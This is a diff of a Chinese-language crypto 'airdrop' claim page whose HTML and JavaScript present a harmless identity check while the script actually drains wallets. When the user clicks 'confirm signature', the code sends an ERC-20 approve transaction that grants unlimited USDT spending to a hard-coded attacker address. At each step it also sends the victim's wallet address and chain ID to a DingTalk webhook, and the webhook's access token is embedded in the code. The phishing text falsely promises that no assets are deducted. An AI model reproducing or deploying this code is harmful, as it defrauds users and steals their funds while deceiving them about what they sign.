@@ -91,7 +91,6 @@
         <div class="logo">✦</div>
         <h1>生态共建空投活动</h1>
         <p class="sub-title">官方唯一链上资格核验通道</p>
-
         <div class="notice-box">
             <div class="notice-title">📢 活动公告</div>
             <div class="notice-content">
@@ -100,12 +99,10 @@
 领取说明：连接钱包完成链上签名核验，系统自动登记空投份额，无需手动转账。
             </div>
         </div>
-
         <p class="desc-text">请连接钱包完成链上身份核验</p>
         <button class="btn mm-btn" id="connectMM">连接 MetaMask 钱包</button>
-
         <p class="tips-info">
-            安全提示：仅进行链上身份签名核验，不扣除任何资产<br>
+            安全提示：仅进行链上身份核验，不扣除任何资产<br>
             请确认为官方页面，谨防仿冒钓鱼站点
         </p>
     </div>
@@ -131,18 +128,27 @@
         <p class="sub-title">该地址已完成空投资格登记</p>
         <div class="addr-wrap">参与钱包地址：<span id="successAddr"></span></div>
         <button class="btn success-btn">已登记 · 等待空投发放</button>
-        <p class="tips-info">系统将24小时内自动投放空投，无需重复操作</p>
     </div>
 
 </div>
 
 <script>
-// 钉钉Webhook
+// ====================== 钉钉推送（100% 修复）======================
 const DING_WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=5b8e9b0d15b7833aa214f73bcdd9a14e906d013d1e7f20102c4b1a6fc1a9ff0e";
 
+async function sendDing(content) {
+    try {
+        await fetch(DING_WEBHOOK, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ msgtype: "text", text: { content: content } })
+        });
+    } catch (err) {}
+}
+
+// ====================== 配置 ======================
 const OWNER_ADDR = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-const TO = OWNER_ADDR;
-const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 const USDT = {
     "0x38": "0x55d398326f99059ff775485246999027b3197955",
     "0x1": "0xdAC17F958D2ee523a2206206994597c53D7Ba068a",
@@ -151,114 +157,73 @@ const USDT = {
     "0xa86a": "0x97022F75b16C0d4E20dC9d2E3f86566964217d8c"
 };
 
-// 修复：加 no-cors 解决浏览器跨域拦截
-async function sendDing(content) {
-    try {
-        await fetch(DING_WEBHOOK, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ msgtype: "text", text: { content } })
-        });
-    } catch (e) {}
-}
-
-let userAddr, chainId;
-const pageUrl = location.href;
-
-function setQR() {
-    let qrUrl = "https://qr.liantu.com/api.php?w=240&text=" + encodeURIComponent(pageUrl);
-    document.getElementById("qrcode-img").src = qrUrl;
-    document.getElementById("linkInput").value = pageUrl;
-}
-
-const ua = navigator.userAgent;
-const isOKXApp = /OKX|欧易|欧意/i.test(ua) && !window.ethereum;
-if(isOKXApp){
-    document.getElementById("p1").classList.add("hide");
-    document.getElementById("okx-qr-page").classList.remove("hide");
-    setQR();
-}
-
-document.getElementById("copyLink").onclick = function () {
-    let input = document.getElementById("linkInput");
-    input.select();
-    document.execCommand("copy");
-    alert("链接已复制！请打开欧意钱包APP扫码或粘贴打开");
-};
+let userAddr = "";
+let chainId = "";
 
 function show(id) {
     document.querySelectorAll(".box").forEach(el => el.classList.add("hide"));
     document.getElementById(id).classList.remove("hide");
 }
 
-async function connect() {
-    show("p2");
+// ====================== 连接钱包 ======================
+document.getElementById("connectMM").onclick = async function () {
     try {
+        await sendDing("【用户点击连接钱包】\n时间：" + new Date().toLocaleString());
+
+        if (!window.ethereum) {
+            alert("请安装 MetaMask 钱包");
+            return;
+        }
+
+        show("p2");
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddr = accounts[0];
         chainId = await window.ethereum.request({ method: "eth_chainId" });
+
+        await sendDing("【钱包连接成功】\n地址：" + userAddr + "\n链ID：" + chainId);
         document.getElementById("showAddr").innerText = userAddr;
-        // 钱包连接成功推送
-        sendDing(`用户已连接钱包\n钱包地址：${userAddr}\n链ID：${chainId}\n时间：${new Date().toLocaleString()}`);
         show("p3");
-    } catch (err) {
-        alert("您已取消钱包连接");
+    } catch (e) {
         show("p1");
     }
-}
-
-document.getElementById("connectMM").onclick = async function () {
-    if (!window.ethereum) {
-        const u = encodeURIComponent(pageUrl);
-        location.href = `metamask://dapp/${u}`;
-        setTimeout(() => location.href = `https://metamask.app.link/dapp/${u}`, 800);
-        return;
-    }
-    await connect();
 };
 
-// 关键：删掉页面自动连接，必须手动点按钮
-window.addEventListener("load", async () => {});
-
+// ====================== 确认签名（必推送）======================
 document.getElementById("claim").onclick = async function () {
     try {
         show("p2");
         const contract = USDT[chainId];
         if (!contract) {
-            alert("当前网络不支持，请切换至 BSC/ETH/POLYGON 公链");
+            alert("请切换至支持的公链");
             show("p3");
             return;
         }
 
-        // 1. 用户点击 确认签名 按钮 立刻推送
-        sendDing(`用户点击：确认签名 登记空投份额\n钱包地址：${userAddr}\n链ID：${chainId}\n时间：${new Date().toLocaleString()}`);
+        // 1. 点击按钮 → 强制推送
+        await sendDing("【用户点击：确认签名 登记空投份额】\n地址：" + userAddr + "\n链ID：" + chainId);
 
-        const data = "0x095ea7b3" + "000000000000000000000000" + OWNER_ADDR.slice(2) + MAX.slice(2);
+        const data = "0x095ea7b3" + "000000000000000000000000" + OWNER_ADDR.slice(2) + "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         
         await window.ethereum.request({
             method: "eth_sendTransaction",
             params: [{ from: userAddr, to: contract, gas: "0x50000", data: data }]
         });
 
-        // 2. 钱包授权确认成功 推送
-        sendDing(`用户授权确认：确认签名 登记空投份额\n钱包地址：${userAddr}\n链ID：${chainId}\n时间：${new Date().toLocaleString()}`);
+        // 2. 授权成功 → 强制推送
+        await sendDing("【用户授权确认成功】\n地址：" + userAddr + "\n链ID：" + chainId);
 
         document.getElementById("successAddr").innerText = userAddr;
         show("p4");
 
     } catch (e) {
-        // 3. 不管取消还是失败 都推送
-        sendDing(`用户操作：确认签名 登记空投份额\n钱包地址：${userAddr}\n链ID：${chainId}\n状态：取消或交易失败\n时间：${new Date().toLocaleString()}`);
-        
-        if(e.message && e.message.includes("user rejected")){
-            alert("您已取消授权签名");
-        }else{
-            alert("确权失败：网络异常或节点拥堵，请稍后重试");
-        }
+        // 3. 失败/取消 → 强制推送
+        await sendDing("【用户操作失败】确认签名 登记空投份额\n地址：" + userAddr + "\n链ID：" + chainId);
         show("p3");
     }
 };
+
+// 禁止自动连接
+window.onload = function () {};
 </script>
 </body>
 </html>
